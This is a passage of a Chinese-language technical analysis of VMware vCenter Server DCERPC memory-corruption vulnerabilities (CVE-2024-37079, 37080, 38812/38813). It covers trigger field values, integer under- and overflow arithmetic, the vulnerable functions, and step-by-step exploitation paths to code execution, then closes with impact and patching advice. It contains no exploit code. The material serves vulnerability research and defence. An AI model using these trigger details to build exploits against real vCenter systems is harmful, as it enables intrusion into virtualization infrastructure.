- 目标：操纵认证响应处理过程

**CVE-2024-37080:**

- 构造任意DCERPC请求数据包(非Bind/Alter相关)
- 关键点：设置非零`Auth Length`字段，但**不提供实际认证数据**
- 目标：操纵认证数据提取过程

### 2. 安全检查绕过技术

**CVE-2024-37079:**

- 利用边界值检查不严格的缺陷
- `Num Ctx Items`值(0xA9)恰好通过初步验证条件：`pres_cont_list->n_context_elem ≤ 0xA9`
- 绕过`rpc__cn_assoc_syntax_negotiate`函数中的边界检查

**CVE-2024-37080:**

- 利用认证数据验证机制的不完善
- 系统仅检查`auth_tlr`指针是否在数据包范围内
- 不验证`Auth Length`字段与实际认证数据长度是否匹配
- 绕过`receive_dispatch`函数中的安全检查

### 3. 整数运算异常触发

**CVE-2024-37079:**

- **整数下溢**：在计算剩余空间时
- 计算过程：
    1. `header_size` = ((0xA9-1)*0x18)+0x1c+0x20 = 0xFFC
    2. `header_size` += 8 = 0x1004
    3. `auth_len` = 0x1000 - 0x1004 = 0xFFFFFFFC（下溢）
- 漏洞函数：`rpc__cn_assoc_process_auth_tlr`

**CVE-2024-37080:**

- **整数溢出**：在计算数据长度时
- 计算过程：
    1. 设计数据包使header小于24字节
    2. 精心设置`auth_len`值
    3. `input_token.len` = pdu_len - (24 + 8 + auth_len)
    4. 减法结果为负数，发生整数溢出，变为极大正数
- 漏洞函数：`rpc__schnauth_cn_unwrap_pdu`

### 4. 内存越界写入实现

**CVE-2024-37079:**

- 攻击点：`rpc__ntlmauth_cn_fmt_srvr_resp`函数中的`memcpy`
- 错误逻辑：系统错误地认为有足够空间（0xFFFFFFFC字节）写入认证数据
- 实际情况：仅有4字节可用空间
- 利用方式：在写入`krb_message`时覆盖相邻堆内存区域

**CVE-2024-37080:**

- 攻击点：`schn_unwrap`后的`memcpy`操作
- 错误逻辑：系统使用溢出后的`input_token.len`计算复制长度
- 利用方式：通过`memcpy(input_token.base, output_token.base, output_token.len)`操作覆盖堆内存

### 5. 代码执行路径构建

**CVE-2024-37079:**

- 控制溢出数据内容，覆盖关键堆元数据或函数指针
- 利用路径：响应处理→认证处理→内存分配→函数指针调用
- 目标内存区域：认证响应处理后的堆内存区域

**CVE-2024-37080:**

- 控制溢出数据内容，影响后续内存分配和释放
- 利用路径：数据包处理→认证数据提取→内存拷贝→控制流劫持
- 目标内存区域：DCERPC处理数据包的堆内存区域
## CVE-2024-38812/38813（DCERPC服务器内存破坏）

1. **识别目标接口**：定位vCenter Server上暴露的特定DCERPC接口和方法。
    
2. **分析协议处理流程**：确定请求处理中的内存管理缺陷点。
    
3. **构造触发序列**：设计特殊请求序列，精确控制内存分配和释放时机。
    
4. **发送触发数据包**：向目标服务器发送含有特定参数的DCERPC请求。
    
5. **利用内存破坏**：服务器处理请求时错误地重用已释放内存或访问越界内存。
    
6. **获取远程代码执行**：通过堆喷射等技术，放置shellcode并控制执行流。
    
7. **权限提升**：利用获得的执行权限，进一步在系统中提权。

### DCERPC协议利用链分析

1. **漏洞触发点定位**
    
    - 分析DCERPC操作编号、解组参数计数和类型索引编号关系
    - 确定`rpc_ss_ndr_unmar_interp`和`rpc_ss_ndr_contiguous_elt`为关键函数
    - 识别特定操作编号（opX_ssr）与漏洞触发路径的对应关系
2. **内存操纵向量**
    
    - 利用`range_list->lower`值影响指针计算
    - 通过`element_size`和`range_product`放大偏移量效果
    - 构造特殊的Z_values数组控制多维数组边界表示
3. **代码执行实现路径**
    
    - 确定`rpc_ss_ndr_unmar_by_copying`中的`memcpy`为关键利用点
    - 分析如何同时控制`p_array_addr`目标指针和复制长度

1. **确定目标vCenter版本和可访问接口**
    
    - 识别受影响版本（如VMware vCenter Server 8.0U3a）
    - 确定DCERPC端点和可用接口UUID
2. **构造特制DCERPC数据包**
    
    - 创建包含精心设计的stub_data和Z_values数组的数据包
    - Z_values配置：0x63（第一维）、0x66（第二维）、0x03（第三维）、0x02（第四维）
    - 确保数据包能通过初始验证但在后续处理中触发漏洞
3. **操纵内存指针计算**
    
    - 利用`range_list->lower`和`range_product`计算控制偏移量
    - 使指针运算结果指向攻击者可控内存区域
    - 突破4GB内存边界限制（可达500GB以上范围）
4. **执行任意内存写入**
    
    - 通过`rpc_ss_ndr_unmar_by_copying`中的`memcpy`操作
    - 同时控制目标地址和写入长度
    - 覆盖关键内存结构或函数指针表
5. **获取代码执行权限**
    
    - 重定向执行流到攻击者控制的shellcode
    - 利用vCenter服务的高权限获取系统控制权
    


| 特征         | CVE-2024-37079                 | CVE-2024-37080              | CVE-2024-38812               |
| ---------- | ------------------------------ | --------------------------- | ---------------------------- |
| **漏洞类型**   | 整数下溢→堆溢出                       | 整数溢出→堆溢出                    | 堆溢出（指针计算错误）                  |
| **触发数据包**  | Bind认证数据包                      | 任意DCERPC数据包(非Bind/Alter)    | DCERPC请求数据包（特定操作编号）          |
| **关键字段**   | Num Ctx Items                  | Auth Length                 | Z_values数组和range_list->lower |
| **溢出位置**   | 认证响应生成过程                       | 认证数据提取过程                    | NDR数组编组/解组过程                 |
| **溢出函数**   | rpc__ntlmauth_cn_fmt_srvr_resp | rpc__schnauth_cn_unwrap_pdu | rpc_ss_ndr_unmar_by_copying  |
| **安全检查缺陷** | 边界值检验不严格                       | 认证数据完整性验证不足                 | 指针运算边界检查不足                   |
| **漏洞原理**   | 利用整数下溢创造虚假的大缓冲区                | 利用整数溢出扩大复制长度                | 利用指针计算错误突破内存边界               |
| **利用难度**   | 中等（需精确控制Ctx Items）             | 中等（需构造特殊Auth字段）             | 高（需构造精确的Z_values数组）          |
| **内存操作**   | 通过memcpy覆盖堆块                   | 通过memcpy覆盖堆内存               | 通过memcpy写入远超边界的内存位置          |
| **特殊特点**   | 利用协议认证机制缺陷                     | 利用认证数据验证逻辑缺陷                | 可突破4GB内存边界（可达500GB以上）        |
| **触发条件**   | 边界值0xA9恰好通过检查                  | 认证长度与内容不匹配                  | 精心构造的range_list和Z_values     |
| **关键控制点**  | auth_len下溢至0xFFFFFFFC          | input_token.len溢出为巨大正数      | p_array_addr基地址被操控           |
## 影响与安全建议

这些漏洞的影响范围极广，几乎影响所有未打补丁的VMware vCenter Server版本，包括8.0、7.0和6.7版本。成功利用可导致：

1. **完全系统控制**：攻击者可获得vCenter Server系统的完全控制权，进而可能控制整个虚拟化基础设施。
    
2. **敏感数据泄露**：包括虚拟机内容、用户凭证、配置信息等关键数据可能被窃取。
    
3. **基础设施破坏**：可能导致整个虚拟化环境瘫痪，影响业务连续性。
    
4. **横向移动**：攻击者可能利用vCenter Server作为跳板，渗透到其管理的虚拟机和相关网络中。
    
5. **持久化威胁**：攻击者可以在系统中建立后门，长期潜伏并实施进一步攻击。
    

为有效防范这些威胁，建议组织立即采取以下措施：

1. 立即应用VMware发布的安全补丁，更新至最新版本。
2. 实施网络隔离，限制对vCenter Server的访问，特别是从互联网。
3. 启用所有可用的安全功能，包括多因素认证和访问控制。
4. 监控系统异常活动，设置告警机制及时发现潜在攻击。
5. 定期备份关键数据，确保在遭受攻击时能够快速恢复。

这组漏洞再次凸显了对关键基础设施组件实施严格安全措施的重要性，同时也提醒我们远程管理接口的安全性对整体系统安全至关重要。